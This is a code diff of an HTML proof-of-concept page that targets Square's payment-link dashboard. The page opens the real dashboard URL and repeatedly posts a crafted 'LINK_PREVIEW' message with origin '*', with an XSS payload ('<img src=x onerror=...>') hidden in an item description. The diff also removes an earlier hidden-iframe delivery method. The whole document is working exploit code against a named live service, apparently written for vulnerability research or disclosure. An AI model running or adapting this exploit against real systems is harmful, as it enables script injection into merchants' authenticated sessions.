@@ -5,106 +5,91 @@
 </head>
 <body>
   <script>
-    const targetUrl = 'https://app.squareup.com/dashboard/payment-links/new'; // 🔥 Replace this
-    	const payload = {
-		name: 'LINK_PREVIEW',
-		data: {
-			type: 'INITIALIZE',
-			uuid: 'poc-' + Date.now(),
-			data: {
-				checkout_link: {
-					id: 'link-1',
-					link_type: 'ITEM_LINK',
-					checkout_link_data: {
-						name: 'Product',
-						link_type: 'ITEM_LINK',
-						order_details: {
-							line_items: [{
-								item_id: 'item-1',
-								quantity: {
-									quantity: 1
-								}
-							}]
-						}
-					}
-				},
-				related_objects: [{
-					type: 'ITEM',
-					id: 'item-1',
-					item_data: {
-						name: 'Product',
-						description_html: '',
-						description: '<img src=x onerror="alert(document.domain)">',
-						variations: [{
-							type: 'ITEM_VARIATION',
-							id: 'var-1',
-							item_variation_data: {
-								item_id: 'item-1',
-								name: 'Default',
-								pricing_type: 'FIXED_PRICING',
-								price_money: {
-									amount: 1000,
-									currency: 'USD'
-								}
-							}
-						}]
-					}
-				}],
-				settings: {
-					checkout_title: 'Test Store'
-				}
-			}
-		}
-	};
+    const targetUrl = 'https://app.squareup.com/dashboard/payment-links/new';
 
+    const payload = {
+      name: 'LINK_PREVIEW',
+      data: {
+        type: 'INITIALIZE',
+        uuid: 'poc-' + Date.now(),
+        data: {
+          checkout_link: {
+            id: 'link-1',
+            link_type: 'ITEM_LINK',
+            checkout_link_data: {
+              name: 'Product',
+              link_type: 'ITEM_LINK',
+              order_details: {
+                line_items: [{
+                  item_id: 'item-1',
+                  quantity: { quantity: 1 }
+                }]
+              }
+            }
+          },
+          related_objects: [{
+            type: 'ITEM',
+            id: 'item-1',
+            item_data: {
+              name: 'Product',
+              description_html: '',
+              description: '<img src=x onerror="alert(document.domain)">',
+              variations: [{
+                type: 'ITEM_VARIATION',
+                id: 'var-1',
+                item_variation_data: {
+                  item_id: 'item-1',
+                  name: 'Default',
+                  pricing_type: 'FIXED_PRICING',
+                  price_money: { amount: 1000, currency: 'USD' }
+                }
+              }]
+            }
+          }],
+          settings: {
+            checkout_title: 'Test Store'
+          }
+        }
+      }
+    };
 
-    function sendPayload(targetWindow, origin = '*') {
-      targetWindow.postMessage(payload, origin);
-    }
+    function sendPayloadMultipleTimes(win, origin = '*', times = 10, delay = 500) {
+      let count = 0;
+      const interval = setInterval(() => {
+        if (win.closed) {
+          console.warn('Target window closed before message could be sent.');
+          clearInterval(interval);
+          return;
+        }
 
-    function tryIframe() {
-      const iframe = document.createElement('iframe');
-      iframe.src = targetUrl;
-      iframe.style.display = 'none'; // hide iframe
-      document.body.appendChild(iframe);
-
-      iframe.onload = () => {
         try {
-          sendPayload(iframe.contentWindow);
-          console.log('Payload sent via iframe');
+          win.postMessage(payload, origin);
+          console.log(`Payload sent (${count + 1}/${times})`);
         } catch (err) {
-          console.warn('iframe postMessage failed, falling back to window.open...');
-          tryWindowOpen();
+          console.error('postMessage error:', err);
         }
-      };
 
-      // fallback if iframe never loads or is blocked
-      setTimeout(() => {
-        if (!iframe.contentWindow) {
-          console.warn('iframe contentWindow not available');
-          tryWindowOpen();
+        count++;
+        if (count >= times) {
+          clearInterval(interval);
+          console.log('Finished sending payload.');
         }
-      }, 3000);
+      }, delay);
     }
-
 
     function tryWindowOpen() {
       const win = window.open(targetUrl, '_blank');
       if (win) {
+        // wait a bit before starting message spam
         setTimeout(() => {
-          try {
-            sendPayload(win);
-            console.log('Payload sent via window.open');
-          } catch (err) {
-            console.error('Failed to send via window.open', err);
-          }
-        }, 2000); // wait for new window to load
+          sendPayloadMultipleTimes(win);
+        }, 2000);
       } else {
         console.error('Popup blocked or window.open failed');
       }
     }
+
     tryWindowOpen();
-    // tryIframe();
   </script>
 </body>
 </html>
